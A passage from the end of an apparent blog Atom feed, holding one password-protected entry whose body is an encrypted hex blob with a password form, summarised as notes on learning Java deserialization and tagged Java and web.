5ef5805386ba35949569f3625447c88d0b43c662ec1bca1d1574b0e5b14d72bc6bbe7816964eee3cb7488a3d458d8e590d58ee5081c9304a0fb8ec06932f3e2752fe7e7d8a23c2a7026ac1349e456624d3294cddf3d0668bc413e5d936b9ef4f1bd6b929d1fb6c535bff8af6d6216317d8a9a03404ba89ac47eb1682a89a775cf4ec677aef46f730a3986a4fdf7b267a8dedb0bad655cc8b952744091941903523c43d59b44dc2a7d8ea60773275e19890faadc99ca4c20f100a2298a57696046296fb11f05d227df4d249fa8a635fe6fb13bec25d213e5546883ba6c69e1d800200116a35acecaf0a6747313d7ac8a563e634ff9b9e363df3b24504c752452fc2358e2db18205fd39e6e5a09e3fab8dffffebf00f41035d8c2f472b7d48753df62094b437783fbf99b984a6b7c28d2e6ff2c472773eed7d1cadb0d7f9a363b22a948f1759e4dff2c98e9c5c1d2c2b93f321b9721081b3022f840ae51586523c92c3acc5ca013b58ab812a1a203bb60ed22f9f3b9196fc8fa61d77b9e4b9a2d265572eca54d7d4020c51597e1c3a56b60673f6f259701a67cfd3ffa1d73ff96c3ffab2abc1ca58de66af6b2ac562b7b591e06530bd52dd617d0bf61d8a042e0097cf01fbf7113625cd1ae0f459146529a4683bb7ba739467912c02462477364a093ff08dbd8f4c52b084acdfa4387b8e3d941855b37a18bd4f4ae1a3e1379f9abf71036eff69ff5b67245fb4b8f862605febe1e47a99608ed5237e14a901e172b47fea1a8147c3d290a502fbc7a9abe6c6d1e35e0c79a9b5cfb85e1e52544d63ec7000bcdc77258ebcb6f2c864d08cf0876de70d09351ada01070fca45c8ddb31d27f59fb7ee0816cd0a4af1ae29e971622ad9bd572ccbcead8383c199cb1053e13cc3d4c9db7f2520f8bde74c80f2ff8a5dd67f4b044a6b87e134d04858257fdeb64bf1572306835b69156c5e0ac562491304c229bfc8f7695c01634d076466f4575825e13e29b514412a2f5b6a229eacafd78310a19ba244d7ac77365b7524f370862b6b14241851</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Java反序列化的学习
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
</feed>
